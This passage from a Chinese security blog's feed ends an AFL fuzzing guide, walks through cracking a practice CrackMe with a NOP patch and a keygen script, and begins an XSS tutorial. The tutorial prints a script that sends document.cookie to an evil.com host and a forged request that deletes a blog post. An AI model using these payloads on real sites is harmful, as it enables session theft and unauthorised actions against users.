表示自从最后一个独特挂起被发现以来经过的时间。</p></li></ul></li><li><p><strong>overall results</strong>：</p><ul><li><p><code>cycles done</code> : 表示 AFL 完成的模糊测试循环次数。每个循环包括一系列的变异测试用例。</p><blockquote><p>如果这个字段变绿就说明后面即使继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</p></blockquote></li><li><p><code>total paths</code> : 表示 AFL 发现的总路径数量。每个路径代表程序执行中的一个独特分支或状态。</p></li><li><p><code>unique crashes</code> : 表示 AFL 发现的独特崩溃数量。这些崩溃可能是潜在漏洞的指示。</p></li><li><p><code>unique hangs</code> : 表示 AFL 发现的独特挂起数量。挂起可能是由于程序陷入无限循环或其他无响应状态造成的。</p></li></ul></li></ol><ul><li><code>cycles done</code>：</li><li><code>uniq crashes</code>：代表的是crash的数量</li></ul><ol start="3"><li><p>cycle progress</p></li><li><p>map coverage</p></li><li><p>stage progress</p><p>包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。 执行速度可以直观地反映当前跑的快不快，如果速度过慢，我们可能需要进一步优化我们的Fuzzing。 </p></li><li><p>findings in depth</p></li><li><p>fuzzing strategy yields</p></li><li><p>path geometry</p></li></ol><h4 id="fuzz-out分析"><a href="#fuzz-out分析" class="headerlink" title="fuzz_out分析"></a>fuzz_out分析</h4><p>使用 <code>tree</code> 命令查看out文件夹的目录结构</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326162321739.png" alt="image-20240326162321739"></p><p>目录中文件的作用：</p><ul><li>**queue&#x2F;**：存放所有具有独特执行路径的测试用例</li><li>**crashes&#x2F;**： 存放能触发待测程序崩溃的测试样本</li><li><strong>hangs&#x2F;</strong> ：存发导致待测程序超时的测试样本</li><li><strong>fuzzer_stats</strong> - 文本文件，包含了fuzzer的实时统计信息，如执行速度、路径覆盖等度量指标。这个文件不断更新以反映当前的fuzzing状态。</li><li><strong>plot_data</strong> - 文本文件，包含了AFL执行过程中的统计数据。使用AFL的<code>afl-plot</code>工具处理<code>plot_data</code>文件，可以生成fuzz过程的可视化图像。</li><li><strong>fuzz_bitmap</strong> - 这是用来记录路径覆盖率的位图（coverage bitmap），非人类可读。AFL使用这个位图来跟踪程序在处理不同输入时执行的不同分支，用来帮助AFL识别新的、唯一的代码路径，以便后续生成更具有探索性的测试样本。</li></ul><p>查看 <code>fuzz_out/crashes</code> 文件夹，下面的十六进制文件即为产生崩溃的结果，</p><p>可以通过 <code>xxd</code> 命令查看对应测试用例的内容</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326161001683.png" alt="image-20240326161001683"></p><p>可以看到产生crash的用例都符合栈溢出漏洞的情况</p><h2 id="qemu模式——无源码黑盒测试"><a href="#qemu模式——无源码黑盒测试" class="headerlink" title="qemu模式——无源码黑盒测试"></a>qemu模式——无源码黑盒测试</h2><p>qemu模式为在没有源代码的情况下，直接对二进制程序进行fuzzing。注意此类方法准确度较低。</p><h3 id="下载安装qemu"><a href="#下载安装qemu" class="headerlink" title="下载安装qemu"></a>下载安装qemu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>当出现各种库的缺失报错，参考：<a src="https://blog.csdn.net/song_lee/article/details/105082092">深入分析 afl &#x2F; qemu-mode(qemu模式) &#x2F; afl-unicorn 编译及安装存在的问题以及相应的解决方案</a></p><p>然后修改 <code>build_qemu_support.sh</code> 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>删除掉红框部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201217863.png" alt="image-20240326201217863"></p><p>找到下面这部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201323845.png" alt="image-20240326201323845"></p><p>删除后三行，更换为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 &lt;../patches/syscall2.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/syscall2.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-clean/linux-user/syscall.c2020-03-12 18:47:47.898592169 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/linux-user/syscall.c2020-03-12 19:16:41.563074307 +0100</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,7 @@</span></span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span></span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line"><span class="meta">@@ -116,6 +117,8 @@</span> int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -256,7 +259,9 @@</span> static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line"><span class="deletion">-_syscall0(int, gettid)</span></span><br><span class="line"><span class="addition">+// taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+#define __NR_sys_gettid __NR_gettid</span></span><br><span class="line"><span class="addition">+_syscall0(int, sys_gettid)</span></span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line"><span class="meta">@@ -6219,7 +6224,8 @@</span> static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line"><span class="deletion">-    info-&gt;tid = gettid();</span></span><br><span class="line"><span class="addition">+    // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+    info-&gt;tid = sys_gettid();</span></span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line"><span class="meta">@@ -6363,9 +6369,11 @@</span> static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), child_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), child_tidptr);</span></span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), parent_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), parent_tidptr);</span></span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line"><span class="meta">@@ -11402,7 +11410,8 @@</span> abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line"><span class="deletion">-        ret = get_errno(gettid());</span></span><br><span class="line"><span class="addition">+        // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+        ret = get_errno(sys_gettid());</span></span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/memfd_create.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line"><span class="comment">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span></span><br><span class="line"><span class="meta">@@ -37,7 +37,7 @@</span></span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"><span class="addition">+int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure><p>再运行 <code>./build_qemu_support.sh</code> ，终于成功了</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201812776.png" alt="image-20240326201812776"></p><h3 id="使用qemu模式fuzz"><a href="#使用qemu模式fuzz" class="headerlink" title="使用qemu模式fuzz"></a>使用qemu模式fuzz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz-in -o fuzz-out -Q ./mips-test</span><br></pre></td></tr></table></figure><p>和有源码fuzz的区别就是加上了一个参数 <code>-Q</code> </p><p>如果为文件输入记得在末尾加上 <code>@@</code></p><h1 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h1><p>在执行 <code>./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</code> 命令的时候，产生了如下报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326203348393.png" alt="image-20240326203348393"></p><p>按照报错信息，输入 <code>echo core &gt;/proc/sys/kernel/core_pattern</code>，提示权限不够的话可以输入以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>这里是因为重定向操作符 <code>&gt;</code> 在执行前就已经获得了 sudo 权限，但是 <code>echo</code> 命令本身并没有获得 sudo 权限。</p><p>解决方法是使用 <code>tee</code> 命令，因为 <code>tee</code> 命令可以将输入内容写入文件，而且可以使用 sudo 权限执行。</p></blockquote><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326094802123.png" alt="image-20240326094802123"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a src="https://zhuanlan.zhihu.com/p/90037601">从AFL开始FUZZ之旅</a></li><li><a src="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing</a></li><li><a src="https://blog.csdn.net/zhongzhehua/article/details/117717656">利用AFL进行模糊测试</a></li><li><a src="https://zhuanlan.zhihu.com/p/680730032">模糊测试工具 AFL的原理与实践</a></li><li><a src="https://blog.csdn.net/weixin_51214674/article/details/134646388?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171145366716800182756803%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=171145366716800182756803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~timeliness~default-3-134646388-null-null.142^v100^pc_search_result_base2&utm_term=afl%20qemu%E5%AE%89%E8%A3%85">模糊测试FUZZ——AFL安装使用</a></li><li><a src="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe001 逆向分析</title>
      <link href="/posts/fadc.html"/>
      <url>/posts/fadc.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><p><strong>160个CrackMe的打包文件下载地址：</strong><a href="https://www.lanzoub.com/ipwFHha3bbc">https://www.lanzoub.com/ipwFHha3bbcc</a> 密码:52pj</p><p>win10虚拟机：<a src="https://blog.csdn.net/lvlheike/article/details/120398259">VMware中安装win10教程</a></p><p>IDA pro7.2：<a src="https://blog.csdn.net/Henryli1202/article/details/135072651">逆向分析学习小纪——IDA Pro工具的安装与基本使用</a></p><p>ollydby1.0 ：<a src="https://blog.csdn.net/fittec/article/details/126825758">OllyDbg下载与安装</a></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>选择CrackMe–001的 <code>Acid burn.exe</code> 进行逆向分析</p><p>首先运行程序，看看程序的功能</p><p>可以看到程序提供了两种登陆方法，分别是：通过序列号和用户名验证，和单独通过序列号验证</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171549838.png" alt="image-20240401171549838"></p><p>选择serial登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112538216.png" alt="image-20240402112538216"></p><p>serial+name登陆方式也一样。</p><p>破解的思路如下：</p><p>因为程序后台肯定是由一个正确的序列号的（不管是代码写死的，还是动态生成的，反正在点击验证按钮的时候，这个序列号肯定是生成好的）。这里出现了对话框，说明作者在校验注册码之后发现如果错误了就直接弹窗，所以只要找到弹出对话框的代码处，向上跟踪，就可以找出判断是否正确的地方了，从而进一步破解程序。</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，而且是用Delphi语言编写的。所以并不需要进行脱壳</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401113359966.png" alt="image-20240401113359966"></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>接下来对程序进行爆破，修改代码使得输入任何子串都提示正确或成功；</p><p>首先将程序放到OD中，Debug –&gt; Run运行程序</p><p>选择serial+name登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171710770.png" alt="image-20240401171710770"></p><p>保持 Try Again 的窗口不要关，然后切换到 OD 界面，按F12暂停程序，进入调试状态。</p><p>点击 Window –&gt; 7 call stack of main thread ，或者直接点击工具栏中的 K 按钮，查看线程堆栈，额可以看到我们选中的这行应该就是弹窗对应的 <code>MessageBoxA函数</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173244715.png" alt="image-20240401173244715"></p><p>选中这一行，右键选择show call跳转到对应的汇编代码出</p><p>跳转到的选中行就是反汇编之后，程序中控制弹出提示框的语句。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173704942.png" alt="image-20240401173704942"></p><p>所以，序列号验证的逻辑肯定就在这句前面不远处。</p><p>往上翻，我们找到了 push ebp 这句代码，这句代码在汇编语言中，一般在程序入口会出现，在 <code>42A193</code> 这里 F2 打个断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401191338213.png" alt="image-20240401191338213"></p><p>重新运行程序（直接点击运行按钮或鼠标选中后按F9）</p><p>重新点击 <code>Check it baby</code> 按钮，在右下角堆栈处找到定位语句最近的一条<code>Return </code> 语句：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202513876.png" alt="image-20240401202513876"></p><p>右键 <code>Follow in Disassm..(反汇编跟随)</code>，这里直接连接了一个跳转，往下面翻，可以看到有这一段<code>JNZ</code>和<code>JMP</code>比较后跳转的两部分代码 Jnz 则进入Good job Dude, 否则就进入JMP Sorry</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202933245.png" alt="image-20240401202933245"></p><p>选中JNZ语句，右键选择 <code>Fill with NOPs</code>，通过nops(空指令填充)替换<code>JNZ</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401203349476.png" alt="image-20240401203349476"></p><p>重新执行程序，仍然是输入 <code>aa</code> ，发现出现了验证失败弹窗，往前翻，发现在执行选择之前有一个审查，如果serial小于4直接验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000609854.png" alt="image-20240402000609854"></p><p>所以我们再重新执行，输入 <code>aaaa</code>，可以看到成功绕过</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401212619104.png" alt="image-20240401212619104"></p><h2 id="分析序号生成算法"><a href="#分析序号生成算法" class="headerlink" title="分析序号生成算法"></a>分析序号生成算法</h2><p>从这里的反汇编部分代码，可以看到用户名的计算算法流程， 首先取出用户名的第一位，乘以0x29。然后再乘以2。保留结果。假设结果为16BE，也就是十 进制的5822</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000725167.png" alt="image-20240402000725167"></p><p>接着，将计算的结果转为字符串，然后和实现准备好的字符串进行拼接，结果为—— CW-5822-CRACKED 这个就是序 列号，也就是说序列号是根据用户名动态生成的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402001450319.png" alt="image-20240402001450319"></p><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密码</span></span><br><span class="line">    key1 = <span class="string">&quot;CW&quot;</span></span><br><span class="line">    key2 = <span class="string">&quot;CRACKED&quot;</span></span><br><span class="line">    <span class="comment"># 输入用户名</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名 长度必须大于等于4: &quot;</span>)</span><br><span class="line">    <span class="comment"># 判断长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;长度必须大于等于4,请重新输入\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 根据用户名生成密码</span></span><br><span class="line">    <span class="comment"># 计算用户名的第一位</span></span><br><span class="line">    username1 = <span class="built_in">ord</span>(username[<span class="number">0</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x3</span>) - username1  <span class="comment"># 左移0x3位再减去原来的值</span></span><br><span class="line">    <span class="comment"># 计算用户名第二位</span></span><br><span class="line">    username2 = <span class="built_in">ord</span>(username[<span class="number">1</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x4</span>) + result1  <span class="comment"># 左移4位再加上原来的结果</span></span><br><span class="line">    <span class="comment"># 计算用户名的第四位</span></span><br><span class="line">    username4 = <span class="built_in">ord</span>(username[<span class="number">3</span>])</span><br><span class="line">    result2 = username4 * <span class="number">0xB</span>  <span class="comment"># 乘以0xB</span></span><br><span class="line">    <span class="comment"># 计算用户名的第三位</span></span><br><span class="line">    username3 = <span class="built_in">ord</span>(username[<span class="number">2</span>])</span><br><span class="line">    result2 = (username3 * <span class="number">0xE</span>) + result2  <span class="comment"># 乘以0xE再加上第四位的结果</span></span><br><span class="line">    <span class="comment"># 再次计算第一位</span></span><br><span class="line">    result3 = username1 * <span class="number">0x29</span> * <span class="number">2</span>  <span class="comment"># 乘以0x29再乘以2</span></span><br><span class="line">    <span class="comment"># 将result3转为ASCII 并拼接密钥</span></span><br><span class="line">    key = <span class="string">f&quot;<span class="subst">&#123;key1&#125;</span>-<span class="subst">&#123;result3&#125;</span>-<span class="subst">&#123;key2&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 打印key</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥为:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行程序，随便输入一个用户名</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112453492.png" alt="image-20240402112453492"></p><p>程序根据输入的用户名算出了一组序列号，输入到目标程序里，成功进入</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112440883.png" alt="image-20240402112440883"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a src="https://blog.csdn.net/wenxuhonghe/article/details/95638925">CrackMe 实战】逆向破解实战之 001 Acid burn.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『XSS攻击』XSS攻击进阶：XSS payload</title>
      <link href="/posts/a4a5.html"/>
      <url>/posts/a4a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-XSS-payload"><a href="#什么是-XSS-payload" class="headerlink" title="什么是 XSS payload"></a>什么是 XSS payload</h1><p>当发现网站存在XSS漏洞时，攻击者能够对该网站植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些<strong>用以完成各种具体功能的恶意脚本</strong>，被称为XSS Payload。</p><blockquote><p>XSS Payload实际上就是JavaScript脚本（还可以是 Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到</p></blockquote><h1 id="最常见的XSS-payload——Cookie劫持"><a href="#最常见的XSS-payload——Cookie劫持" class="headerlink" title="最常见的XSS payload——Cookie劫持"></a>最常见的XSS payload——Cookie劫持</h1><ol><li><p><strong>概念</strong></p><p>最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p><blockquote><p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p></blockquote></li><li><p><strong>例子</strong></p><p>如下所示，攻击者可以先构造一个含恶意参数的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载一个远程脚本，真正的XSS Payload写在远程脚本 <code>evil.js</code> 中。</p><blockquote><p>这样可以避免直接在URL的参数里写入大量的JavaScript代码。</p></blockquote><p>在 <code>evil.js</code>  中，可以通过如下代码窃取Cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img -<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.evil.com/log?&quot;</span> + <span class="built_in">escape</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>当用户访问这个构造的url时执行脚本，这段代码在页面中插入了一张看不见的图片，同时把 docnment cookie对象作为参数发送到远程服务器。</p><p>这样就实现了cookie 的劫持</p></li></ol><p>在成功实现XSS攻击后，除了cookie劫持之外，攻击者还有很多更强大的 XSS payload来控制用户的浏览器</p><h1 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h1><ol><li><p><strong>原理</strong></p><p>一个网站的应用，只需要接受HTTP协议中的GET 或 POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p></li><li><p><strong>构造GET请求例子</strong></p><p>假设某博客网站存在XSS漏洞，我们如何通过XSS漏洞来删除掉博客上的某篇文章？</p><p>假设正常删除该文章的链接是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>攻击者可以构造一段javascript代码（XSS Payload）如下，</p><p>这段代码中，通过插入一个img标签来发起一个GET请求，从而对删除文章的链接发出了请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>后续，攻击者只需要通过XSS漏洞诱使用户执行这段XSS Payload，就会删除这篇文章</p></li><li><p><strong>构造POST请求例子</strong></p><p>如果网站上只有一个表单，即仅接收POST请求，如何实施XSS攻击？</p><p>可以通过两种方法实现攻击：</p><ul><li><p><strong>1）构造一个form表单，自动提交这个表单</strong></p><ul><li><p>a. 一个个构造DOM节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="variable language_">document</span>.<span class="property">createElement</span> (<span 